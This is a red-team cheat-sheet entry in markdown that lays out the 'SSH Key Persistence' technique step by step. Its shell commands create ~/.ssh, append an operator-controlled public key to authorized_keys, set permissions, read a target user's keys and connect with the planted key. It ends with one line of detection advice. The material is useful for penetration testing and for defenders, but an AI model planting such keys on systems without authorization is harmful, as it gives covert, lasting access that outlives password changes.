---
technique: SSH Key Persistence
category: persistence
targets: Linux User Accounts
protocols: SSH
remote_capable: true
tags: linux persistence ssh authorized-keys
---

# SSH Key Persistence

Adding a controlled public key to `authorized_keys` provides SSH access that survives password changes when public key authentication is enabled.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Write access | Operator must write to the target user's `.ssh` directory |
| SSH daemon | sshd must allow public key authentication |
| Public key | A controlled public key must be available |

## Linux

### Step 1: Create SSH directory

#sh #ssh

Create the `.ssh` directory for the current user.

```sh title:"Create .ssh directory"
mkdir -p ~/.ssh
```
<!-- cheat -->

### Step 2: Set SSH directory mode

#sh #ssh

Set permissions required by sshd.

```sh title:"Set .ssh directory mode"
chmod 700 ~/.ssh
```
<!-- cheat -->

### Step 3: Add authorized key

#sh #ssh

Append a public key to the current user's authorized keys.

```sh title:"Append public key to authorized_keys"
printf '%s\n' "$public_key" >> ~/.ssh/authorized_keys
```
<!-- cheat
var public_key
-->

### Step 4: Set authorized_keys mode

#sh #ssh

Set permissions required for `authorized_keys`.

```sh title:"Set authorized_keys mode"
chmod 600 ~/.ssh/authorized_keys
```
<!-- cheat -->

### Read authorized keys

#sh #ssh

Read a target user's authorized keys.

```sh title:"Read authorized_keys"
cat "$target_home/.ssh/authorized_keys"
```
<!-- cheat
var target_home
-->

### Connect with planted key

#sh #ssh

Connect using the planted private key.

```sh title:"Connect with planted SSH key"
ssh -i "$key_file" "$user@$rhost_ip"
```
<!-- cheat
var key_file
var user
var rhost_ip
-->

## Detection

Monitor writes to `.ssh/authorized_keys`, new SSH keys, and successful key-based logins from new source addresses.
